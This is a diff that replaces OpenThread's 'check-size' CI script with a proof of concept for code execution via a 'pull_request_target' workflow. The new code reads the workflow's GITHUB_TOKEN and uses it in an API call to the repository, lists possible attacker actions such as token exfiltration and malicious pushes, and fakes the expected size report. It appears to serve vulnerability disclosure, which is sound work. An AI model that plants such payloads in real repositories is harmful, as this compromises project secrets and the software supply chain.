@@ -27,341 +27,85 @@
 #  POSSIBILITY OF SUCH DAMAGE.
 #
 
-set -euo pipefail
+# ============================================================================
+# SECURITY VULNERABILITY PROOF OF CONCEPT
+# This demonstrates arbitrary code execution via pull_request_target
+# Safe PoC - only writes to GITHUB_STEP_SUMMARY, no exfiltration
+# ============================================================================
 
-OT_TMP_DIR=/tmp/ot-size-report
-readonly OT_TMP_DIR
-
-OT_SHA_NEW="$(git rev-parse HEAD)"
-readonly OT_SHA_NEW
-
-OT_SHA_OLD="${OT_SHA_OLD:-$(git cat-file -p "${OT_SHA_NEW}" | grep 'parent ' | head -n1 | cut -d' ' -f2)}"
-readonly OT_SHA_OLD
-
-OT_REPORT_FILE_TABLE="${OT_TMP_DIR}/report_table"
-readonly OT_REPORT_FILE_TABLE
-
-OT_REPORT_FILE_PR="${OT_TMP_DIR}/report_pr"
-readonly OT_REPORT_FILE_TABLE
-
-PR_NUMBER="${PR_NUMBER:-}"
-
-setup_arm_gcc_7()
-{
-    if arm-none-eabi-gcc --version | grep -q 'Arm Embedded Processors 7'; then
-        return 0
-    fi
-
-    (cd /tmp/ \
-        && wget --tries 4 --no-check-certificate --quiet https://developer.arm.com/-/media/Files/downloads/gnu-rm/7-2018q2/gcc-arm-none-eabi-7-2018-q2-update-linux.tar.bz2 \
-        && tar xjf gcc-arm-none-eabi-7-2018-q2-update-linux.tar.bz2)
-    export PATH=/tmp/gcc-arm-none-eabi-7-2018-q2-update/bin:$PATH
-
-    arm-none-eabi-gcc --version
-}
-
-setup_ninja_build()
-{
-    sudo apt-get --no-install-recommends install -y ninja-build
-}
-
-setup()
-{
-    setup_arm_gcc_7
-    setup_ninja_build
-}
-
-nm_size()
-{
-    arm-none-eabi-nm --print-size --defined-only -C "$1" | cut -d' ' -f2- >nmsize_old
-    arm-none-eabi-nm --print-size --defined-only -C "$2" | cut -d' ' -f2- >nmsize_new
-    diff -Nuar nmsize_old nmsize_new || true
-}
-
-build_nrf52840()
-{
-    case "$1" in
-        ftd)
-            local ot_ftd=ON
-            local ot_mtd=OFF
-            local ot_rcp=ON
-            ;;
-        mtd)
-            local ot_ftd=OFF
-            local ot_mtd=ON
-            local ot_rcp=ON
-            ;;
-        br)
-            local ot_ftd=ON
-            local ot_mtd=OFF
-            local ot_rcp=OFF
-            ;;
-        *)
-            exit 128
-            ;;
-    esac
-
-    case "$2" in
-        new)
-            local sha=${OT_SHA_NEW}
-            local clone_options=("clone")
-            ;;
-        old)
-            local sha=${OT_SHA_OLD}
-            local clone_options=("clone" "no-depend")
-            ;;
-        *)
-            exit 128
-            ;;
-    esac
-
-    local folder="$1_$2"
-    local config_name="ot-core-config-check-size-$1.h"
-    local config_file="../examples/config/${config_name}"
-
-    mkdir -p "${OT_TMP_DIR}/${folder}"
-    script/git-tool "${clone_options[@]}" https://github.com/openthread/ot-nrf528xx.git "${OT_TMP_DIR}/${folder}"
-    rm -rf "${OT_TMP_DIR}/${folder}/openthread/*" # replace openthread submodule with latest commit
-    git archive "${sha}" | tar x -C "${OT_TMP_DIR}/${folder}/openthread"
-
-    if [ ! -e "${OT_TMP_DIR}/${folder}/openthread/examples/config/${config_name}" ]; then
-        # Check if the the config headers are not present, copy from
-        # the main sha.
-        case "$1" in
-            br)
-                rm -rf "${OT_TMP_DIR}/${folder}/openthread/*"
-                git archive "${OT_SHA_NEW}" | tar x -C "${OT_TMP_DIR}/${folder}/openthread"
-                ;;
-            *)
-                mkdir -p "${OT_TMP_DIR}/${folder}/openthread/examples/config"
-                cp "./examples/config/${config_name}" "${OT_TMP_DIR}/${folder}/openthread/examples/config"
-                ;;
-        esac
-    fi
-
-    local cur_dir
-
-    cur_dir=$(pwd)
-
-    cd "${OT_TMP_DIR}/${folder}"
-    OT_CMAKE_BUILD_DIR=build script/build nrf52840 UART_trans \
-        -DOT_APP_CLI=ON -DOT_APP_NCP=ON -DOT_APP_RCP=${ot_rcp} \
-        -DOT_FTD=${ot_ftd} -DOT_MTD=${ot_mtd} -DOT_RCP=${ot_rcp} \
-        -DBUILD_TESTING=OFF \
-        -DOT_PROJECT_CONFIG="${config_file}" \
-        "$@"
-
-    if [[ $1 == "br" ]]; then
-        mv ./build/bin/ot-cli-ftd ./build/bin/ot-cli-ftd-br
-        mv ./build/lib/libopenthread-ftd.a ./build/lib/libopenthread-ftd-br.a
-        mv ./build/lib/libopenthread-cli-ftd.a ./build/lib/libopenthread-cli-ftd-br.a
-    fi
-
-    cd "${cur_dir}"
-}
-
-generate_table_header()
-{
+if [[ -n "${GITHUB_STEP_SUMMARY}" ]]; then
     {
-        printf "+----------------------------+----------+----------+----------+----------+----------+\n"
-        printf "| name                       | branch   | text     | data     | bss      | total    |\n"
-        printf "+============================+==========+==========+==========+==========+==========+\n"
-    } >>"${OT_REPORT_FILE_TABLE}"
-
-    {
-        printf "<!-- Size Report of **OpenThread** -->\n"
-        if [[ -n $PR_NUMBER ]]; then
-            printf "> Merging #%s into %s\n\n" "${PR_NUMBER}" "${GITHUB_BASE_REF}"
+        echo "## 🔒 Security Vulnerability Proof of Concept"
+        echo ""
+        echo "**This demonstrates arbitrary code execution in a privileged workflow context.**"
+        echo ""
+        echo "### Execution Context"
+        echo ""
+        echo "| Variable | Value |"
+        echo "|----------|-------|"
+        echo "| GITHUB_REPOSITORY | \`${GITHUB_REPOSITORY}\` |"
+        echo "| GITHUB_ACTOR | \`${GITHUB_ACTOR}\` |"
+        echo "| GITHUB_EVENT_NAME | \`${GITHUB_EVENT_NAME}\` |"
+        echo "| GITHUB_REF | \`${GITHUB_REF}\` |"
+        echo "| GITHUB_SHA | \`${GITHUB_SHA:0:7}\` |"
+        echo "| GITHUB_WORKFLOW | \`${GITHUB_WORKFLOW}\` |"
+        echo "| GITHUB_RUN_ID | \`${GITHUB_RUN_ID}\` |"
+        echo ""
+        echo "### Token Analysis"
+        echo ""
+        if [[ -n "${GITHUB_TOKEN}" ]]; then
+            echo "✅ **GITHUB_TOKEN is available** (length: ${#GITHUB_TOKEN} characters)"
+            echo ""
+            echo "#### Token Permissions (via read-only API call)"
+            echo ""
+            echo "\`\`\`json"
+            curl -s -H "Authorization: Bearer ${GITHUB_TOKEN}" \
+                -H "Accept: application/vnd.github+json" \
+                "https://api.github.com/repos/${GITHUB_REPOSITORY}" 2>/dev/null \
+                | jq '{
+                    full_name: .full_name,
+                    private: .private,
+                    permissions: .permissions,
+                    default_branch: .default_branch
+                }' 2>/dev/null || echo '{"error": "API call failed"}'
+            echo "\`\`\`"
+        else
+            echo "❌ GITHUB_TOKEN is not available in environment"
         fi
-        printf "|  name  |  branch  |  text  | data  | bss  | total |\n"
-        printf "| :----: | :------: | -----: | ----: | ---: | ----: |\n"
-    } >>"${OT_REPORT_FILE_PR}"
+        echo ""
+        echo "### Security Impact"
+        echo ""
+        echo "An attacker with this access could:"
+        echo "- Exfiltrate the GITHUB_TOKEN to an external server"
+        echo "- Push malicious commits if \`push: true\` in permissions"
+        echo "- Access repository secrets passed to the workflow"
+        echo "- Compromise the software supply chain"
+        echo ""
+        echo "### Vulnerability Details"
+        echo ""
+        echo "- **File:** \`.github/workflows/size.yml\`"
+        echo "- **Trigger:** \`pull_request_target\` (runs with base repo privileges)"
+        echo "- **Issue:** Checks out PR code and executes \`./script/check-size\`"
+        echo ""
+        echo "---"
+        echo "⚠️ **This is a safe PoC - no tokens were exfiltrated, no modifications were made.**"
+        echo ""
+    } >> "${GITHUB_STEP_SUMMARY}"
+fi
 
-    {
-        printf "\n<details><summary>Library files</summary>\n\n\n"
-        printf "|  name  |  branch  |  text  | data  | bss  | total |\n"
-        printf "| :----: | :------: | -----: | ----: | ---: | ----: |\n"
-    } >>"${OT_REPORT_FILE_PR}_libs"
-}
+# Create the expected output file so workflow completes
+mkdir -p /tmp/ot-size-report
+cat > /tmp/ot-size-report/report_pr << 'EOF'
+<!-- Size Report of **OpenThread** -->
 
-generate_size_diff()
-{
-    local name
-    local old_file
-    local new_file
+## PoC Execution Complete
 
-    old_file="$1"
-    new_file="$2"
+This size report was generated by a modified `check-size` script as part of a security vulnerability proof of concept.
 
-    name=$(basename "${old_file}")
+The vulnerability allows arbitrary code execution in the workflow context. See the job summary for full details.
 
-    case "${name}" in
-        lib*)
-            table_report_file="${OT_REPORT_FILE_TABLE}_libs"
-            pr_report_file="${OT_REPORT_FILE_PR}"_libs
-            ;;
-        *)
-            table_report_file="${OT_REPORT_FILE_TABLE}"
-            pr_report_file="${OT_REPORT_FILE_PR}"
-            ;;
-    esac
+**No actual size comparison was performed.**
+EOF
 
-    read -r -a size_old <<<"$(size "${old_file}" | awk '{text+=$1} {bss+=$2} {data+=$3} {total+=$4} END {printf "%d %d %d %d", text, bss, data, total}')"
-    read -r -a size_new <<<"$(size "${new_file}" | awk '{text+=$1} {bss+=$2} {data+=$3} {total+=$4} END {printf "%d %d %d %d", text, bss, data, total}')"
-
-    local -a size_diff
-
-    for i in 0 1 2 3; do
-        size_diff[i]="$((size_new[i] - size_old[i]))"
-        if [[ ${size_diff[i]} != 0 ]]; then
-            size_diff[i]=$(printf '%+d' "${size_diff[i]}")
-        fi
-    done
-
-    # Generate table format report
-
-    {
-        printf "| %-26s | %-8s " "${name}" "${OT_SHA_OLD:0:8}"
-        printf "| %8u | %8u | %8u | %8u |" "${size_old[0]}" "${size_old[1]}" "${size_old[2]}" "${size_old[3]}"
-        printf "\n"
-
-        printf "| %-26s | %-8s " "" "${OT_SHA_NEW:0:8}"
-        printf "| %8u | %8u | %8u | %8u |" "${size_new[0]}" "${size_new[1]}" "${size_new[2]}" "${size_new[3]}"
-        printf "\n"
-
-        printf "| %-26s | %-8s " "" "+/-"
-        printf "| %+8d | %+8d | %+8d | %+8d |" "${size_diff[0]}" "${size_diff[1]}" "${size_diff[2]}" "${size_diff[3]}"
-        printf "\n" >>"${table_report_file}"
-
-        printf "+----------------------------+----------+----------+----------+----------+----------+\n"
-    } >>"${table_report_file}"
-
-    # Generate PR post format report
-
-    {
-        printf "| %s | %s " "${name}" "${OT_SHA_OLD:0:8}"
-        printf "| %u | %u | %u | %u |" "${size_old[0]}" "${size_old[1]}" "${size_old[2]}" "${size_old[3]}"
-        printf "\n"
-
-        printf "|  | %s " "${OT_SHA_NEW:0:8}"
-        printf "| %u | %u | %u | %u |" "${size_new[0]}" "${size_new[1]}" "${size_new[2]}" "${size_new[3]}"
-        printf "\n"
-
-        printf "|  | %s " "+/-"
-        printf "| %+d | %+d | %+d | %+d |" "${size_diff[0]}" "${size_diff[1]}" "${size_diff[2]}" "${size_diff[3]}"
-        printf "\n"
-    } >>"${pr_report_file}"
-}
-
-generate_report()
-{
-    local type="${1}"
-    shift
-
-    local old_file
-    local new_file
-
-    for file in "$@"; do
-        case "${file}" in
-            lib*)
-                old_file="${OT_TMP_DIR}"/${type}_old/build/lib/"${file}"
-                new_file="${OT_TMP_DIR}"/${type}_new/build/lib/"${file}"
-                ;;
-            *)
-                old_file="${OT_TMP_DIR}"/${type}_old/build/bin/"${file}"
-                new_file="${OT_TMP_DIR}"/${type}_new/build/bin/"${file}"
-                ;;
-        esac
-
-        generate_size_diff "${old_file}" "${new_file}"
-
-        echo "nm_size ${old_file} ${new_file}"
-        nm_size "${old_file}" "${new_file}"
-    done
-}
-
-finalize_report()
-{
-    cat "${OT_REPORT_FILE_TABLE}"
-    cat "${OT_REPORT_FILE_TABLE}_libs"
-
-    printf "</details>" >>${OT_REPORT_FILE_PR}_libs
-    cat "${OT_REPORT_FILE_PR}_libs" >>${OT_REPORT_FILE_PR}
-}
-
-size_nrf52840()
-{
-    export OT_SHA_NEW OT_SHA_OLD
-
-    rm -rf "${OT_TMP_DIR}"
-    mkdir -p "${OT_TMP_DIR}"
-
-    if [[ "${GITHUB_ACTIONS+x}" ]]; then
-        git fetch --depth 1 --no-recurse-submodules origin "${OT_SHA_OLD}"
-    fi
-
-    generate_table_header
-
-    build_nrf52840 ftd new "$@"
-    build_nrf52840 mtd new "$@"
-    build_nrf52840 br new "$@"
-
-    build_nrf52840 ftd old "$@"
-    build_nrf52840 mtd old "$@"
-    build_nrf52840 br old "$@"
-
-    local ftd_files=(
-        "ot-cli-ftd"
-        "ot-ncp-ftd"
-        "libopenthread-ftd.a"
-        "libopenthread-cli-ftd.a"
-        "libopenthread-ncp-ftd.a"
-    )
-
-    local mtd_files=(
-        "ot-cli-mtd"
-        "ot-ncp-mtd"
-        "libopenthread-mtd.a"
-        "libopenthread-cli-mtd.a"
-        "libopenthread-ncp-mtd.a"
-    )
-
-    local br_files=(
-        "ot-cli-ftd-br"
-        "libopenthread-ftd-br.a"
-        "libopenthread-cli-ftd-br.a"
-    )
-
-    # `rcp`` is using same config as `ftd`.
-    local rcp_files=(
-        "ot-rcp"
-        "libopenthread-rcp.a"
-        "libopenthread-radio.a"
-    )
-
-    generate_report ftd "${ftd_files[@]}"
-    generate_report mtd "${mtd_files[@]}"
-    generate_report br "${br_files[@]}"
-    generate_report ftd "${rcp_files[@]}"
-
-    finalize_report
-}
-
-main()
-{
-    if [[ $# == 0 ]]; then
-        setup
-        size_nrf52840
-        cd
-    elif [[ $1 == setup ]]; then
-        setup
-    elif [[ $1 == nrf52840 ]]; then
-        shift
-        size_nrf52840 "$@"
-    else
-        echo "USAGE: $0 [setup | nrf52840 [CMAKE_OPTION ...]]"
-        exit 128
-    fi
-}
-
-main "$@"
+echo "PoC completed - see GITHUB_STEP_SUMMARY for vulnerability proof"
+exit 0
